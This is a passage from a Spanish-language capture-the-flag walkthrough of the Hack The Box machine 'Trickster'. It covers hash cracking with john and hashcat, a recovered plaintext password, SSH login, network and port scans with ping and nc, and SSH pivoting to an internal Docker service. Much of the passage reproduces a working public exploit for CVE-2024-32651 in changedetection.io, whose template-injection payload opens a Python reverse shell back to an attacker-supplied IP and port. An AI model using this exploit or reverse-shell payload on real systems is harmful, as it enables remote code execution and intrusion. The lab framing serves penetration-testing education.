  <span class="token number">25800</span> <span class="token operator">|</span> bcrypt<span class="token punctuation">(</span>sha1<span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">))</span> / bcryptsha1                           <span class="token operator">|</span> Forums, CMS, E-Commerce
  <span class="token number">28400</span> <span class="token operator">|</span> bcrypt<span class="token punctuation">(</span>sha512<span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">))</span> / bcryptsha512                       <span class="token operator">|</span> Forums, CMS, E-Commerce


</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Creds :<br>
Crackeamos las passwords con hashcat o john </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">john credentials <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
hashcat <span class="token parameter variable">-m</span> <span class="token number">3200</span>  credentials /usr/share/wordlists/rockyou.txt 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">james <span class="token builtin class-name">:</span> alwaysandforever
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="User James" dir="auto" class="heading" id="User_James"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>User James</h2><div class="heading-children"><div class="el-p"><p dir="auto">Nos logeamos por ssh</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  Trickster <span class="token function">ssh</span> james@trickster.htb
The authenticity of <span class="token function">host</span> <span class="token string">'trickster.htb (10.10.11.34)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>trickster.htb<span class="token string">' (ED25519) to the list of known hosts.
james@trickster.htb'</span>s password: 
Last login: Thu Sep <span class="token number">26</span> <span class="token number">11</span>:13:01 <span class="token number">2024</span> from <span class="token number">10.10</span>.14.41
james@trickster:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>james<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>james<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>james<span class="token punctuation">)</span>
james@trickster:~$ <span class="token function">whoami</span>
james
james@trickster:~$ 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Sudo -l :</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">james@trickster:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> james: 
Sorry, user james may not run <span class="token function">sudo</span> on trickster.
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Revisando la configuracion de la red vemos que tenemos acceso a una red de docker pero no podemos ejecutar comandos de docker ya que james no forma parte del grupo docker:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token number">1</span>: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="token number">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet <span class="token number">127.0</span>.0.1/8 scope <span class="token function">host</span> lo
       valid_lft forever preferred_lft forever
<span class="token number">2</span>: eth0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1500</span> qdisc mq state UP group default qlen <span class="token number">1000</span>
    link/ether 00:50:56:94:e4:77 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet <span class="token number">10.10</span>.11.34/23 brd <span class="token number">10.10</span>.11.255 scope global eth0
       valid_lft forever preferred_lft forever
<span class="token number">3</span>: docker0: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1500</span> qdisc noqueue state UP group default 
    link/ether 02:42:18:3b:cb:65 brd ff:ff:ff:ff:ff:ff
    inet <span class="token number">172.17</span>.0.1/16 brd <span class="token number">172.17</span>.255.255 scope global docker0
       valid_lft forever preferred_lft forever
<span class="token number">37</span>: vethf843401@if36: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">1500</span> qdisc noqueue master docker0 state UP group default 
    link/ether 0e:e5:f9:ea:9f:36 brd ff:ff:ff:ff:ff:ff link-netnsid <span class="token number">0</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">viendo que tenemos una interfaz de ip's de docker vamos a escanear la red en búsqueda de posibles puntos de ataque;</p></div><div class="el-p"><p dir="auto">Ya que nmap no esta  instalado en la maquina vamos a escanear la maquina con tecnicas lotl (living off the land)</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" rel="noopener nofollow" class="external-link" href="https://sevenlayers.com/index.php/blog/490-living-off-the-land-scanning" target="_blank">Living  off the land tecniches : nmap</a></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="Escaneo de Ips;" dir="auto" class="heading" id="Escaneo_de_Ips;"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Escaneo de Ips;</h3><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">james@trickster:~$ <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">254</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ping</span> <span class="token parameter variable">-w</span> <span class="token number">2</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">172.17</span>.0.<span class="token variable">$i</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"64 bytes"</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token string">' '</span> <span class="token parameter variable">-f</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/://'</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span class="token punctuation">;</span>

<span class="token number">172.17</span>.0.1
<span class="token number">172.17</span>.0.2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Vemos que tiene conexion con 2 ips dentro del rango;<br>
la <code>172.17.0.1 </code>es la del propio host; mientras que la <code>172.17.0.2</code> parece de un container; vamos a investigar puertos abiertos</p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Escaneo de puertos" dir="auto" class="heading" id="Escaneo_de_puertos"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Escaneo de puertos</h3><div class="heading-children"><div class="el-p"><p dir="auto">Escaneamos con nc el rango entero de puertos de la ip <code>172.17.0.2</code></p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">james@trickster:~$ <span class="token function">nc</span> <span class="token parameter variable">-vnz</span> <span class="token parameter variable">-w</span> <span class="token number">1</span> <span class="token number">172.17</span>.0.2 <span class="token number">1</span>-65535 <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> succeeded
Connection to <span class="token number">172.17</span>.0.2 <span class="token number">5000</span> port <span class="token punctuation">[</span>tcp/*<span class="token punctuation">]</span> succeeded<span class="token operator">!</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Tenemos conexion con el puerto 5000 vamos a hacer pivoting con ssh</p></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Pivoting" dir="auto" class="heading" id="Pivoting">Pivoting</h1><div class="heading-children"><div class="el-p"><p dir="auto">Tenemos algun servicio corriendo en un docker en la ip <code>172.17.0.2</code> por el puerto 5000 vamos a hacer un puente con ssh para tener conexion con el puerto aunque podriamos hacer pivoting con chisel ,metaexploit o lingolo-ng;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  ~ <span class="token function">ssh</span> james@trickster.htb <span class="token parameter variable">-L</span> <span class="token number">5000</span>:172.17.0.2:5000
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Podemos escanear el puerto con nmap a ver si encontramos informacion del servicio; ahora que esta establecido el puente la conexion</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sCV</span> <span class="token parameter variable">-p</span> <span class="token number">5000</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> localhost
PORT     STATE SERVICE VERSION                                       
<span class="token number">5000</span>/tcp <span class="token function">open</span>  http    Python http.server <span class="token number">3.5</span> - <span class="token number">3.10</span>
<span class="token operator">|</span> http-title: Change Detection
<span class="token operator">|</span>_Requested resource was /login?next<span class="token operator">=</span>/
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Supported Methods: HEAD OPTIONS GET
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Nos encontramos ante un changedetection.io en la v0.45.20<br>
<span alt="Pasted image 20250214113934.png" src="Pasted image 20250214113934.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250214113934.png" src="machines/trickster/imgs/pasted-image-20250214113934.png"></span></p></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="SSTI" dir="auto" class="heading" id="SSTI">SSTI</h1><div class="heading-children"><div class="el-p"><p dir="auto">Investigando sobre la version de changedetection.io ; vemos que la version es vulnerable a la un SSTI en la version actual </p></div><div class="el-p"><p dir="auto">Un <strong>SSTI</strong> (Server-Side Template Injection) es una vulnerabilidad de seguridad que permite a un atacante inyectar y ejecutar código en la plantilla de una aplicación del lado del servidor, aprovechando malas prácticas en el procesamiento de datos dinámicos. Esto puede llevar a la ejecución remota de código, acceso no autorizado o robo de datos sensibles. Ocurre cuando la aplicación inserta entradas de usuario sin sanitizar en templates que son procesados por el servidor.</p></div><div class="el-p"><p dir="auto">Para mas informacion sobre ataques SSTI podemos visitar la pagina de <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/server-side-template-injection" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger</a></p></div><div class="el-p"><p dir="auto">Esta vulnerabilidad de changedetection.io esta documentada en el <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-32651" target="_blank">CVE-2024-32651</a></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="CVE-2024-32651" dir="auto" class="heading" id="CVE-2024-32651"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>CVE-2024-32651</h3><div class="heading-children"><div class="el-p"><p dir="auto">Buscamos en github y hay un PoC que automatiza el proceso del SSTI ; pongo el codigo y lo analizamos;</p></div><div class="el-p"><p dir="auto">Al siguiente script debemos pasarle las siguientes variables</p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto"><code>--url</code>: URL base del sitio vulnerable (Nuestro caso: <code>http://localhost:5000</code>).</li>
<li data-line="1" dir="auto"><code>--port</code>: Puerto en el que el atacante escuchará la conexión inversa </li>
<li data-line="2" dir="auto"><code>--ip</code>: Dirección IP del atacante para recibir la conexión inversa. (Nuestra interfaz <code>tun0</code>)</li>
<li data-line="3" dir="auto"><code>--notification</code>: URL de notificación personalizada (opcional).</li>
</ul></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded"><span class="token comment"># Exploit Title: changedetection &lt;= 0.45.20 Remote Code Execution (RCE)</span>
<span class="token comment"># Date: 5-26-2024</span>
<span class="token comment"># Exploit Author: Zach Crosman (zcrosman)</span>
<span class="token comment"># Vendor Homepage: changedetection.io</span>
<span class="token comment"># Software Link: https://github.com/dgtlmoon/changedetection.io</span>
<span class="token comment"># Version: &lt;= 0.45.20</span>
<span class="token comment"># Tested on: Linux</span>
<span class="token comment"># CVE : CVE-2024-32651</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
<span class="token keyword">import</span> argparse

<span class="token keyword">def</span> <span class="token function">start_listener</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    listener <span class="token operator">=</span> listen<span class="token punctuation">(</span>port<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Listening on port </span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>
    conn <span class="token operator">=</span> listener<span class="token punctuation">.</span>wait_for_connection<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connection received!"</span><span class="token punctuation">)</span>
    context<span class="token punctuation">.</span>newline <span class="token operator">=</span> <span class="token string">b'\r\n'</span>
    <span class="token comment"># Switch to interactive mode</span>
    conn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add_detection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> listen_ip<span class="token punctuation">,</span> listen_port<span class="token punctuation">,</span> notification_url<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token comment"># First request to get CSRF token</span>
    request1_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span>
        <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
        <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span>
        <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
        <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"en-US,en;q=0.9"</span><span class="token punctuation">,</span>
        <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span>
    <span class="token punctuation">}</span>

    response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>request1_headers<span class="token punctuation">)</span>
    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'html.parser'</span><span class="token punctuation">)</span>
    csrf_token <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'csrf_token'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Obtained CSRF token: </span><span class="token interpolation"><span class="token punctuation">{</span>csrf_token<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    <span class="token comment"># Second request to submit the form and get the redirect URL</span>
    add_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/form/add/quickwatch"</span></span>
    add_url_headers <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment"># Define add_url_headers here</span>
        <span class="token string">"Origin"</span><span class="token punctuation">:</span> url<span class="token punctuation">,</span>
        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
    <span class="token punctuation">}</span>
    add_url_data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"csrf_token"</span><span class="token punctuation">:</span> csrf_token<span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://reddit.com/r/baseball"</span><span class="token punctuation">,</span>
        <span class="token string">"tags"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"edit_and_watch_submit_button"</span><span class="token punctuation">:</span> <span class="token string">"Edit &gt; Watch"</span><span class="token punctuation">,</span>
        <span class="token string">"processor"</span><span class="token punctuation">:</span> <span class="token string">"text_json_diff"</span>
    <span class="token punctuation">}</span>

    post_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>add_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>add_url_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>add_url_data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

    <span class="token comment"># Extract the URL from the Location header</span>
    <span class="token keyword">if</span> <span class="token string">'Location'</span> <span class="token keyword">in</span> post_response<span class="token punctuation">.</span>headers<span class="token punctuation">:</span>
        redirect_url <span class="token operator">=</span> post_response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Redirect URL: </span><span class="token interpolation"><span class="token punctuation">{</span>redirect_url<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No redirect URL found'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    <span class="token comment"># Third request to add the changedetection url with ssti in notification config</span>
    save_detection_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>redirect_url<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    save_detection_headers <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment"># Define save_detection_headers here</span>
        <span class="token string">"Referer"</span><span class="token punctuation">:</span> redirect_url<span class="token punctuation">,</span>
        <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"session=</span><span class="token interpolation"><span class="token punctuation">{</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
    <span class="token punctuation">}</span>

    save_detection_data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"csrf_token"</span><span class="token punctuation">:</span> csrf_token<span class="token punctuation">,</span>
        <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"https://reddit.com/r/all"</span><span class="token punctuation">,</span>
        <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"tags"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"time_between_check-weeks"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"time_between_check-days"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"time_between_check-hours"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"time_between_check-minutes"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"time_between_check-seconds"</span><span class="token punctuation">:</span> <span class="token string">'30'</span><span class="token punctuation">,</span>
        <span class="token string">"filter_failure_notification_send"</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span>
        <span class="token string">"fetch_backend"</span><span class="token punctuation">:</span> <span class="token string">'system'</span><span class="token punctuation">,</span>
        <span class="token string">"webdriver_delay"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"webdriver_js_execute_code"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"method"</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>
        <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"body"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"notification_urls"</span><span class="token punctuation">:</span> notification_url<span class="token punctuation">,</span>
        <span class="token string">"notification_title"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"notification_body"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"""
        {{% for x in ().__class__.__base__.__subclasses__() %}}
        {{% if "warning" in x.__name__ %}}
        {{{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\\"</span><span class="token interpolation"><span class="token punctuation">{</span>listen_ip<span class="token punctuation">}</span></span><span class="token string">\\",</span><span class="token interpolation"><span class="token punctuation">{</span>listen_port<span class="token punctuation">}</span></span><span class="token string">));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")'").read()}}}}
        {{% endif %}}
        {{% endfor %}}
        """</span></span><span class="token punctuation">,</span>
        <span class="token string">"notification_format"</span><span class="token punctuation">:</span> <span class="token string">'System default'</span><span class="token punctuation">,</span>
        <span class="token string">"include_filters"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"subtractive_selectors"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"filter_text_added"</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span>
        <span class="token string">"filter_text_replaced"</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span>
        <span class="token string">"filter_text_removed"</span><span class="token punctuation">:</span> <span class="token string">'y'</span><span class="token punctuation">,</span>
        <span class="token string">"trigger_text"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"ignore_text"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"text_should_not_be_present"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"extract_text"</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">"save_button"</span><span class="token punctuation">:</span> <span class="token string">'Save'</span>
    <span class="token punctuation">}</span>
    final_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>save_detection_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>save_detection_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>save_detection_data<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Final request made.'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Add detection and start listener'</span><span class="token punctuation">)</span>
